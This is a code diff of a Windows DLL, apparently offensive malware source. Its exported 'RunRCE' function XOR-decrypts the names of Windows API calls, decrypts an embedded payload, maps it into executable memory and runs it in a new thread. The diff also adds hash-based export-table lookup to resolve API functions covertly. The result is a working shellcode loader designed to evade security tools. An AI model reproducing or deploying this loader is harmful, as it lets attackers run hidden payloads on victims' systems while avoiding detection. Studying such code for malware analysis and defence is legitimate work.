@@ -43,68 +43,95 @@ VOID (WINAPI * pRtlMoveMemory)(
 );
 
 void XOR(char * data, size_t data_len, char * key, size_t key_len) {
-    int j;
+  int j;
 
-    j = 0;
-    for (int i = 0; i < data_len; i++) {
-            if (j == key_len - 1) j = 0;
+  j = 0;
+  for (int i = 0; i < data_len; i++) {
+    if (j == key_len - 1) j = 0;
+    data[i] = data[i] ^ key[j];
+    j++;
+  }
+}
 
-            data[i] = data[i] ^ key[j];
-            j++;
+DWORD calcMyHash(char* data) {
+  DWORD hash = 0x35;
+  for (int i = 0; i < strlen(data); i++) {
+    hash += data[i] + (hash << 1);
+  }
+  return hash;
+}
+
+static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
+  PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
+  PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
+  PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
+    (LPBYTE)h + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+  PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
+  PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
+  PWORD  fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);
+
+  for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
+    LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
+
+    if (calcMyHash(pFuncName) == myHash) {
+      // printf("successfully found! %s - %d\n", pFuncName, myHash);
+      return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
     }
+  }
+  return nullptr;
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
-    switch (ul_reason_for_call)  {
-    case DLL_PROCESS_ATTACH:
-    case DLL_PROCESS_DETACH:
-    case DLL_THREAD_ATTACH:
-    case DLL_THREAD_DETACH:
-        break;
-    }
-    return TRUE;
+  switch (ul_reason_for_call)  {
+  case DLL_PROCESS_ATTACH:
+  case DLL_PROCESS_DETACH:
+  case DLL_THREAD_ATTACH:
+  case DLL_THREAD_DETACH:
+      break;
+  }
+  return TRUE;
 }
 
 extern "C" {
 __declspec(dllexport) BOOL WINAPI RunRCE(void) {
-    void * exec_mem;
-    BOOL rv;
-    HANDLE th;
-    DWORD oldprotect = 0;
+  void * exec_mem;
+  BOOL rv;
+  HANDLE th;
+  DWORD oldprotect = 0;
 
-    // decrypt VirtualAlloc
-    XOR((char *) s_va, s_va_len, s_va_key, sizeof(s_va_key));
-    pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), s_va);
+  // decrypt VirtualAlloc
+  XOR((char *) s_va, s_va_len, s_va_key, sizeof(s_va_key));
+  pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), s_va);
 
-    // allocate memory for payload
-    exec_mem = pVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+  // allocate memory for payload
+  exec_mem = pVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-    // decrypt payload
-    XOR((char *) my_payload, my_payload_len, my_payload_key, sizeof(my_payload_key));
+  // decrypt payload
+  XOR((char *) my_payload, my_payload_len, my_payload_key, sizeof(my_payload_key));
 
-    // copy payload to allocated buffer
-    XOR((char *) s_rmm, s_rmm_len, s_rmm_key, sizeof(s_rmm_key));
-    pRtlMoveMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), s_rmm);
-    pRtlMoveMemory(exec_mem, my_payload, my_payload_len);
+  // copy payload to allocated buffer
+  XOR((char *) s_rmm, s_rmm_len, s_rmm_key, sizeof(s_rmm_key));
+  pRtlMoveMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), s_rmm);
+  pRtlMoveMemory(exec_mem, my_payload, my_payload_len);
 
-    // decrypt VirtualProtect
-    XOR((char *) s_vp, s_vp_len, s_vp_key, sizeof(s_vp_key));
-    pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), s_vp);
-    rv = pVirtualProtect(exec_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
+  // decrypt VirtualProtect
+  XOR((char *) s_vp, s_vp_len, s_vp_key, sizeof(s_vp_key));
+  pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), s_vp);
+  rv = pVirtualProtect(exec_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
 
-    // if all good, launch the payload
-    if ( rv != 0 ) {
+  // if all good, launch the payload
+  if ( rv != 0 ) {
 
-        // decrypt CreateThread
-        XOR((char *) s_ct, s_ct_len, s_ct_key, sizeof(s_ct_key));
-        pCreateThread = GetProcAddress(GetModuleHandle("kernel32.dll"), s_ct);
-        th = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
+      // decrypt CreateThread
+      XOR((char *) s_ct, s_ct_len, s_ct_key, sizeof(s_ct_key));
+      pCreateThread = GetProcAddress(GetModuleHandle("kernel32.dll"), s_ct);
+      th = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
 
-        // decrypt WaitForSingleObject
-        XOR((char *) s_wfso, s_wfso_len, s_wfso_key, sizeof(s_wfso_key));
-        pWaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), s_wfso);
-        pWaitForSingleObject(th, -1);
-    }
-    return TRUE;
-    }
+      // decrypt WaitForSingleObject
+      XOR((char *) s_wfso, s_wfso_len, s_wfso_key, sizeof(s_wfso_key));
+      pWaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), s_wfso);
+      pWaitForSingleObject(th, -1);
+  }
+  return TRUE;
+  }
 }
